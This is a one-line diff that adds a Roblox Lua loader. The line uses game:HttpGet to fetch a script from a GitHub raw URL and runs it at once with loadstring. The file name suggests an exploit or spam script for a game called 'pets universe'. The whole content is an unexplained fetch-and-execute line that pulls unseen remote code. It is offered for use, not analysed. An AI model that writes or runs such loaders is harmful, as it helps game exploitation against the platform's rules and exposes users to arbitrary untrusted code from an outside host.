@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/pets-universe-spam7-l3m0oqidifgeh2.lua"))()
